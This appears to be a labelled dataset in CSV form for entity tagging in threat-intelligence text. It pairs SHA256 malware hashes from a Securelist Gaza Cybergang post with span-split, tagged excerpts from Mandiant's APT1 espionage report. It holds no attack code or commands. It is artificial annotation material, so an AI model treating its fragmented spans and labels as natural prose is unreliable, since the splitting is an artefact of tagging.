DocName,text,intent
Gaza Cybergang - updated activity in 2017_ - Securelist,344dc6ece5a6dacce9050a65305d4b34865756051a6f414477b6fa381e1c1b63,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,42e4298f5162aba825309673187e27121e3f918238e81f3a6e021c03f3455154,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,44a8d0561a9cc6e24d6935ff4c35b7b7db50c4001eb01c48ea1cfd13253bc694,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,57a12f20c6bbd69b93e76d6d5a31d720046b498aa880b95b85a4f3fda28aac4f,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,72b039550d31afaeee11dedf7d80333aeda5c504272d426ae0d91bc0cd82c5b0,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,72d2ad8f38e60c23c96698149507fc627664a5706a4431b96014fbf25495b529,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,788f7fd06030f87d411c61efbc52a3efca03359570353da209b2ce4ccf5b4b70,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,7fcac2f18a8844e4af9f923891cfb6f637a99195a457b6cdb916926d709c6a04,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,84adba3c81ad1c2a8285c31d1171f6f671492d9f3ed5ee2c7af326a9a8dc5278,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,852ccc491204f227c3da58a00f53846296454d124b23021bdb168798c8eee2fb,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,86bd78b4c8c94c046d927fb29ae0b944bf2a8513a378b51b3977b77e59a52806,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,9347a47d63b29c96a4f39b201537d844e249ac50ded388d66f47adc4e0880c7e,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,b597d7b5b9c2f1962257f912e911961ad0da4c28fc6a90a0b7db4e242aa007d8,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,bfb88878a22c23138a67cc25872e82d77e54036b846067ddc43e988c50379915,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,c23f715c8588c8d8725352ed515749389d898996107132b2d25749a4efc82a90,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,c47bc2c15f08655d158bb8c9d5254c804c9b6faded526be6879fa94ea4a64f72,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,db53b35c80e8ec3f8782c4d34c83389e8e9b837a6b3cc700c1b566e4e4450ec2,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,dd9debe517717552d7422b08a477faa01badbcc4074830c080a1a1c763e1a544,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,b800d29d6e1f2f85c5bc036e927c1dae745a3c646389599b0754592d76b5564b,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,APT,threat_actor
Gaza Cybergang - updated activity in 2017_ - Securelist,"  ARABIC MALWARE  MACROS  MOBILE MALWARE

TARGETED ATTACKS  VULNERABILITIES AND EXPLOITS

Related Posts

    

Analyzing an
exploit for
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,СVE-2017-11826,O
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Bad Rabbit,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,"
ransomware

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,BlackOasis APT,threat_actor
Gaza Cybergang - updated activity in 2017_ - Securelist,"
and new
targeted
attacks
leveraging
zero-day
exploit

https://securelist.com/all?tag=538
https://securelist.com/all?tag=660
https://securelist.com/all?tag=542
https://securelist.com/all?tag=76
https://securelist.com/all?tag=53
https://securelist.com/all?tag=41
https://securelist.com/analyzing-an-exploit-for-%d1%81ve-2017-11826/82869/
https://securelist.com/bad-rabbit-ransomware/82851/
https://securelist.com/blackoasis-apt-and-new-targeted-attacks-leveraging-zero-day-exploit/82732/",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"
Exposing One of ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"’s Cyber 
Espionage Units



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"  www.mandiant.com

Contents

Executive Summary .......................................................................................................... 2

",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,’s Computer Network Operations Tasking to ,O
Mandiant_APT1_Report,PLA Unit 61398,threat_actor
Mandiant_APT1_Report," (61398部队) .................... 7

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": Years of Espionage  ............................................................................................... 20

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": Attack Lifecycle .................................................................................................... 27

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": Infrastructure ....................................................................................................... 39

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": Identities ............................................................................................................. 51

Conclusion ..................................................................................................................... 59

Appendix A: How Does ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," Distinguish Threat Groups? .............................................. 61

Appendix B: ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," and the Attack Lifecycle......................................................................... 63

Appendix C (Digital): The Malware Arsenal ........................................................................ 66

Appendix D (Digital): FQDNs ............................................................................................ 67

Appendix E (Digital): MD5 Hashes ................................................................................... 68

Appendix F (Digital): SSL Certificates ............................................................................... 69

Appendix G (Digital): IOCs ............................................................................................... 70

Appendix H (Digital): Video .............................................................................................. 74



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 1 www.mandiant.com

“",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,’s economic espionage has reached an intolerable level and I believe that the ,O
Mandiant_APT1_Report,United States,country
Mandiant_APT1_Report, and our allies in ,O
Mandiant_APT1_Report,Europe,country
Mandiant_APT1_Report," and 
",O
Mandiant_APT1_Report,Asia,country
Mandiant_APT1_Report, have an obligation to confront ,O
Mandiant_APT1_Report,Beijing,city
Mandiant_APT1_Report," and demand that they 
put a stop to this piracy. 

",O
Mandiant_APT1_Report,Beijing,city
Mandiant_APT1_Report," is waging a massive trade war on us all, and we should 
band together to pressure them to stop. Combined, the ",O
Mandiant_APT1_Report,United States,country
Mandiant_APT1_Report, and our allies in ,O
Mandiant_APT1_Report,Europe,country
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Asia,country
Mandiant_APT1_Report," have significant 
diplomatic and economic leverage over ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,", and we should 
use this to our advantage to put an end to this scourge.”1

— ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report, Rep. ,O
Mandiant_APT1_Report,Mike Rogers,identity
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,"October, 2011",timestamp
Mandiant_APT1_Report,"

“ It is unprofessional and groundless to accuse the ",O
Mandiant_APT1_Report,Chinese military,org
Mandiant_APT1_Report," of launching cyber attacks 
without any conclusive evidence.”2

— ",O
Mandiant_APT1_Report,Chinese Defense Ministry,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,"January, 2013",timestamp
Mandiant_APT1_Report,"

1 “",O
Mandiant_APT1_Report,Mike Rogers,identity
Mandiant_APT1_Report,", Statement to the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report," House, Permanent Select Committee on Intelligence, Open Hearing: Cyber Threats and Ongoing Efforts to 
Protect the Nation, Hearing, ",O
Mandiant_APT1_Report,"October 4, 2011",timestamp
Mandiant_APT1_Report,", http://intelligence.house.gov/sites/intelligence.house.gov/files/documents/100411CyberHearingRogers.
pdf, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".
2 “Chinese hackers suspected in attack on The Post’s computers.” The ",O
Mandiant_APT1_Report,Washington Post,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,"Feb. 1, 2013",timestamp
Mandiant_APT1_Report,", http://www.washingtonpost.com/business/
technology/chinese-hackers-suspected-in-attack-on-the-posts-computers/2013/02/01/d5a44fde-6cb1-11e2-bd36-c0fe61a205f6_story.html, 
accessed ",O
Mandiant_APT1_Report,"Feb. 1, 2013",timestamp
Mandiant_APT1_Report,".



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 2 www.mandiant.com

exeCutIve suMMary

",O
Mandiant_APT1_Report,Since 2004,timestamp
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," has investigated computer security breaches at hundreds of organizations around the world. 
The majority of these security breaches are attributed to advanced threat actors referred to as the “Advanced Persistent 
Threat” (",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report,). We first published details about the ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report, in our ,O
Mandiant_APT1_Report,January 2010,timestamp
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,M-Trends,org
Mandiant_APT1_Report," report. As we stated in the 
report, our position was that “The ",O
Mandiant_APT1_Report,Chinese government,org
Mandiant_APT1_Report," may authorize this activity, but there’s no way to determine the 
extent of its involvement.” Now, three years later, we have the evidence required to change our assessment. The details 
we have analyzed during hundreds of investigations convince us that the groups conducting these activities are based 
primarily in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report, and that the ,O
Mandiant_APT1_Report,Chinese Government,org
Mandiant_APT1_Report," is aware of them.3 

",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, continues to track dozens of ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups around the world; however, this report is focused on the most 
prolific of these groups. We refer to this group as “",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,” and it is one of more than 20 ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups with origins in 
",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,. ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," is a single organization of operators that has conducted a cyber espionage campaign against a broad 
range of victims ",O
Mandiant_APT1_Report,since at least 2006,timestamp
Mandiant_APT1_Report,". From our observations, it is one of the most prolific cyber espionage groups in 
terms of the sheer quantity of information stolen. The scale and impact of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s operations compelled us to write this 
report.

The activity we have directly observed likely represents only a small fraction of the cyber espionage that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has 
conducted. Though our visibility of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s activities is incomplete, we have analyzed the group’s intrusions against 
nearly 150 victims over seven years. From our unique vantage point responding to victims, we tracked ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," back 
to four large networks in ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,", two of which are allocated directly to the Pudong New Area. We uncovered a 
substantial amount of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s attack infrastructure, command and control, and modus operandi (tools, tactics, and 
procedures). In an effort to underscore there are actual individuals behind the keyboard, ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," is revealing three 
personas we have attributed to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". These operators, like soldiers, may merely be following orders given to them by 
others.

Our analysis has led us to conclude that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, is likely government-sponsored and one of the most persistent of ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"’s 
cyber threat actors. We believe that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," is able to wage such a long-running and extensive cyber espionage campaign 
in large part because it receives direct government support. In seeking to identify the organization behind this activity, 
our research found that ",O
Mandiant_APT1_Report,People’s Liberation Army,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,’s) ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report, is similar to ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," in its mission, capabilities, and 
resources. ",O
Mandiant_APT1_Report,PLA Unit 61398,threat_actor
Mandiant_APT1_Report, is also located in precisely the same area from which ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," activity appears to originate.

3 Our conclusions are based exclusively on unclassified, open source information derived from ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," observations. None of the information in 
this report involves access to or confirmation by classified intelligence.

https://www.mandiant.com/resources/m-trends/


",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 3 www.mandiant.com

KEY FINDINGS

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, is believed to be the 2nd Bureau of the ,O
Mandiant_APT1_Report,People’s Liberation army,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,) ,O
Mandiant_APT1_Report,General Staff Department,org
Mandiant_APT1_Report,"’s 
(",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report,") 3rd Department (总参三部二局), which is most commonly known by its ",O
Mandiant_APT1_Report,Military unit Cover Designator,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,MUCD,org
Mandiant_APT1_Report,) as ,O
Mandiant_APT1_Report,unit 61398,threat_actor
Mandiant_APT1_Report," (61398部队).
»» The nature of “",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,’s” work is considered by ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," to be a state secret; however, we believe it engages in 

harmful “Computer Network Operations.” 

»» ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report, is partially situated on Datong Road (大同路) in ,O
Mandiant_APT1_Report,Gaoqiaozhen,city
Mandiant_APT1_Report," (高桥镇), which is located in the Pudong 
New Area (浦东新区) of ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," (上海). The central building in this compound is a 130,663 square foot facility 
that is 12 stories high and was built ",O
Mandiant_APT1_Report,in early 2007,timestamp
Mandiant_APT1_Report,".

»» We estimate that ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," is staffed by hundreds, and perhaps thousands of people based on the size of ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"’s physical infrastructure. 

»» ",O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report," provided special fiber optic communications infrastructure for the unit in the name of national 
defense.

»» ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," requires its personnel to be trained in computer security and computer network operations and also 
requires its personnel to be proficient in the English language. 

»» ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, has traced ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,’s activity to four large networks in ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,", two of which serve the Pudong New Area 
where ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," is based.

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has systematically stolen hundreds of terabytes of data from at least 141 organizations, and has 
demonstrated the capability and intent to steal from dozens of organizations simultaneously.4

»» ",O
Mandiant_APT1_Report,Since 2006,timestamp
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, has observed ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," compromise 141 companies spanning 20 major industries.

»» ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has a well-defined attack methodology, honed over years and designed to steal large volumes of valuable 
intellectual property.

»» Once ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has established access, they periodically revisit the victim’s network over several months or years 
and steal broad categories of intellectual property, including technology blueprints, proprietary manufacturing 
processes, test results, business plans, pricing documents, partnership agreements, and emails and contact lists 
from victim organizations’ leadership. 

»» ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," uses some tools and techniques that we have not yet observed being used by other groups including two 
utilities designed to steal email — ",O
Mandiant_APT1_Report,GETMAIL,malware
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,MAPIGET,malware
Mandiant_APT1_Report,".

»» ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, maintained access to victim networks for an average of 356 days.5 The longest time period ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," maintained 
access to a victim’s network was 1,764 days, or four years and ten months.

»» Among other large-scale thefts of intellectual property, we have observed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," stealing 6.5 terabytes of 
compressed data from a single organization over a ten-month time period. 

»» ",O
Mandiant_APT1_Report,In the first month of 2011,timestamp
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," successfully compromised at least 17 new victims operating in 10 different 
industries.

4  We believe that the extensive activity we have directly observed represents only a small fraction of the cyber espionage that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has conducted. 
Therefore, ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, is establishing the lower bounds of ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," activities in this report.
5  This is based on 91 of the 141 victim organizations. In the remaining cases, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," activity is either ongoing or else we do not have visibility into 
the last known date of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," activity in the network.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 4 www.mandiant.com

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," focuses on compromising organizations across a broad range of industries in english-speaking 
countries. 
»» Of the 141 ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," victims, 87% of them are headquartered in countries where English is the native language. 

»» The industries ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, targets match industries that ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," has identified as strategic to their growth, including four of 
the seven strategic emerging industries that ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," identified in its 12th Five Year Plan. 

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," maintains an extensive infrastructure of computer systems around the world.
»» ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," controls thousands of systems in support of their computer intrusion activities. 

»» In the last two years we have observed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," establish a minimum of 937 Command and Control (C2) servers 
hosted on 849 distinct IP addresses in 13 countries. The majority of these 849 unique IP addresses were 
registered to organizations in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," (709), followed by the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report," (109). 

»» In the last three years we have observed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," use fully qualified domain names (FQDNs) resolving to 988 unique 
IP addresses.

»» ",O
Mandiant_APT1_Report,Over a two-year period,timestamp
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,January 2011 to January 2013,timestamp
Mandiant_APT1_Report,") we confirmed 1,905 instances of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," actors logging into 
their attack infrastructure from 832 different IP addresses with ",O
Mandiant_APT1_Report,Remote Desktop,software
Mandiant_APT1_Report,", a tool that provides a remote user 
with an interactive graphical interface to a system.

»» In the last several years we have confirmed 2,551 FQDNs attributed to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". 

In over 97% of the 1,905 times ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, observed ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intruders connecting to their attack 
infrastructure, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, used IP addresses registered in ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," and systems set to use the simplified 
Chinese language.
»» In 1,849 of the 1,905 (97%) of the ",O
Mandiant_APT1_Report,Remote Desktop,software
Mandiant_APT1_Report, sessions ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," conducted under our observation, the ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 

operator’s keyboard layout setting was “Chinese (Simplified) — US Keyboard”. ",O
Mandiant_APT1_Report,Microsoft’s Remote Desktop,software
Mandiant_APT1_Report," client 
configures this setting automatically based on the selected language on the client system. Therefore, the ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
attackers likely have their ",O
Mandiant_APT1_Report,Microsoft,org
Mandiant_APT1_Report,"® operating system configured to display Simplified Chinese fonts.

»» 817 of the 832 (98%) IP addresses logging into ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, controlled systems using ,O
Mandiant_APT1_Report,Remote Desktop,software
Mandiant_APT1_Report," resolved back to 
",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,".

»» We observed 767 separate instances in which ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, intruders used the “,O
Mandiant_APT1_Report,HUC Packet Transmit Tool,tool
Mandiant_APT1_Report,” or ,O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report," 
to communicate between 614 distinct routable IP addresses and their victims’ systems using their attack 
infrastructure. Of the 614 distinct IP addresses used for ",O
Mandiant_APT1_Report,HTRAN,tool
Mandiant_APT1_Report," communications: 

»− 614 of 614 (100%) were registered in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,".

»− 613 (99.8%) were registered to one of four ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," net blocks. 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 5 www.mandiant.com

the size of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s infrastructure implies a large organization with at least dozens, but potentially 
hundreds of human operators. 
»» We conservatively estimate that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s current attack infrastructure includes over 1,000 servers.

»» Given the volume, duration and type of attack activity we have observed, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," operators would need to be directly 
supported by linguists, open source researchers, malware authors, industry experts who translate task requests 
from requestors to the operators, and people who then transmit stolen information to the requestors. 

»» ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," would also need a sizable IT staff dedicated to acquiring and maintaining computer equipment, people who 
handle ",O
Mandiant_APT1_Report,finances,industry
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,facility management,industry
Mandiant_APT1_Report,", and ",O
Mandiant_APT1_Report,logistics,industry
Mandiant_APT1_Report," (e.g., ",O
Mandiant_APT1_Report,shipping,industry
Mandiant_APT1_Report,").

In an effort to underscore that there are actual individuals behind the keyboard, ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," is revealing 
three personas that are associated with ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," activity. 
»» The first persona, “",O
Mandiant_APT1_Report,UglyGorilla,identity
Mandiant_APT1_Report,"”, has been active in computer network operations since ",O
Mandiant_APT1_Report,October 2004,timestamp
Mandiant_APT1_Report,". His activities 

include registering domains attributed to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, and authoring malware used in ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, campaigns. “,O
Mandiant_APT1_Report,UglyGorilla,identity
Mandiant_APT1_Report,"” 
publicly expressed his interest in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,’s “cyber troops” in ,O
Mandiant_APT1_Report,January 2004,timestamp
Mandiant_APT1_Report,".

»» The second persona, an actor we call “",O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report,"”, has registered dozens of email accounts used to conduct ",O
Mandiant_APT1_Report,social engineering,technique
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,spear phishing,technique
Mandiant_APT1_Report, attacks in support of ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, campaigns. “,O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report,” used a ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," phone number 
while registering these accounts.

»» We have observed both the “",O
Mandiant_APT1_Report,UglyGorilla,identity
Mandiant_APT1_Report,” persona and the “,O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report,"” persona using the same shared infrastructure, 
including FQDNs and IP ranges that we have attributed to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". 

»» The third persona, who uses the nickname “",O
Mandiant_APT1_Report,SUPERHARD,identity
Mandiant_APT1_Report,",” is the creator or a significant contributor to the ",O
Mandiant_APT1_Report,AURIGA,malware
Mandiant_APT1_Report," 
and ",O
Mandiant_APT1_Report,BANGAT,malware
Mandiant_APT1_Report, malware families which we have observed ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, and other ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report, groups use. “,O
Mandiant_APT1_Report,SUPERHARD,identity
Mandiant_APT1_Report,"” discloses 
his location to be the Pudong New Area of ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,".

",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," is releasing more than 3,000 indicators to bolster defenses against ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," operations. 
»» Specifically, ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," is providing the following: 

»− Digital delivery of over 3,000 ",O
